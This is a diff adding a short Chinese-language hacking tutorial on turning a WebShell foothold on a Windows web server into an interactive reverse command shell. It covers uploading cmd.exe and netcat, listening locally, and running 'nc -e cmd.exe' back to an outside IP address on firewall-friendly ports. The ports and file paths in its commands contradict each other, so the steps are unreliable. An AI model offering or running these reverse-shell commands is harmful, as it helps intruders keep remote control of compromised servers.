@@ -1,0 +1,28 @@
+利用WebShell反弹低权限CmdShell
+0
+虽然是低权限的，能做的事和WebShell上的差不多，不过使用起来还是要方便很多。
+
+前提：
+1.能用WebShell运行cmd命令。
+方法有很多，首先是WScript.Shell，如果被改名或者被删了，就找可运行目录上传cmd.exe。
+
+2.上传nc。可以跟cmd.exe上传到同一目录。
+
+步骤：
+现在本地监听一个端口。
+
+nc -vv -l -p 8080
+
+最好是80或8080这样的端口，被防火墙拦截的几率小很多。我机器80被Apache占了，就用8080了。
+
+在WebShell运行下面命令连接我们监听的端口得到CmdShell:
+
+nc -vv 58.60.173.255 23456 -e C:\windows\temp\History\cmd.exe
+
+(假设cmd.exe是上传在“C:\Documents and Settings\All Users\Documents\”这个目录的)
+稍等片刻，不出意外的话就可以得到CmdShell了。
+
+不过我前面也说了，是低权限的CmdShell，能做的事情很少，但如果我们要运行很多cmd命令的话，还是要方便很多。
+如果要在反弹的CmdShell里面运行上传的程序，要用如下个格式:
+
+C:\WINDOWS\system32\inetsrv>"C:\Documents and Settings\All Users\Documents\cmd.exe"
